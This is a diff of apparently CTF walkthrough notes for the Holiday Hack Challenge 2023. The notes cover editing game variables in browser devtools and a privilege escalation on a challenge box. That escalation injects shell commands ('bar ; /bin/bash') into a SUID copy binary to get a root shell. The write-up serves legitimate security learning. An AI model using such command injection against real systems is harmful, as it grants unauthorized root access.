@@ -19,18 +19,31 @@
 ### Snowball Fight
 
 - Enter the game lobby and inspect the game window (iFrame) to open developer tools
+
 - go to sources (chrome) or debugger (Firefox)
+
 - pause in debugger
+
 - expand global variables to see what is available
+
 - Noteworthy variables include hit box sizes, player health, elf & santa throw delay, snowball damage, singlePlayer: "false" (more on this below)
+
 - In random games with another player you can pause the game once started and adjust above values and resume to gain an edge
+
 - In Chrome these can be directly edited under Glocal variables while paused or entered in the console at any time. In Firefox they must be entered in the console (ensure the proper context is selected when executing)
+
 - to access single player mode observe the URL of the game within the lobby and private rooms (inspector, sources > room/)
+
 - note that in private rooms the URL ends with `&singlePlayer=false`
+
 - This can also be seen in reading through the room/ javascript where the URL parameters are constructed; including references to Jared...err...Elf the Dwarf joining your team if singlePlayer='true'
+
 - Attempting to set the Global variable to `true` while in lobby generally doesn't work but it did once though without spawning Elf the Dwarf
+
 - Directly navigating to the URL with `&singplePlayer=true` will spawn Elf the Dwarf but the game seems to hang at this point
-- Selecting the game context and entering `window.location.href="https://hhc23-snowball.holidayhackchallenge.com/room/?username=<username>&roomId=<room id>&roomType=private&gameType=co-op&id=<some uuid>&dna=<player dna>&singlePlayer=false"` will refresh and create the single player instance.
+
+- Selecting the game context and entering `window.location.href="https://hhc23-snowball.holidayhackchallenge.com/room/?username=<username>&roomId=<room id>&roomType=private&gameType=co-op&id=<some uuid>&dna=<player dna>&singlePlayer=false"` will refresh and create the single player instance
+
 - In single player the variables above can also be modified to achieve much glory! (`jaredSprite.throwDelay=1`)
 
 ## Santa's Surf Shack
@@ -112,7 +125,7 @@ Copy hash and password list to system with hashcat
 
 search for binaries with suid
 
-`find / -perm /4000`
+`find / -perm /4000 2> /dev/null`
 
 - /usr/bin/simplecopy runs as root
 
@@ -120,22 +133,32 @@ search for binaries with suid
 
 - let's test it out
 
-`simplecopy /root/runtoanswer ~/`
+`simplecopy /root/* ./`
+
+- This copies the ***runmetoanswer*** binary from the root folder, though, it isn't much help as we can't execute it 
 
 - Investigating the binary reveals that it executes 'cp %s %s' so we can inject commands
 
 `strings /usr/bin/simplecopy`
     
-    simplecopy foo "/tmp && whoami"
+    
+    simplecopy foo "bar ; whoami"
+    cp: cannot stat 'foo': No such file or directory
     root
 
-    simplecopy foo "/tmp && /bin/bash"
+    simplecopy foo "bar ; /bin/bash"
     cd /root
     ./runmetoanswer
+
+
+or 
+
+    simplecopy foo "bar ; /root/runmetoanswer
 
     Who delivers Christmas Presents?
 
     santa
+
 
 ## Tarnished Trove 
 
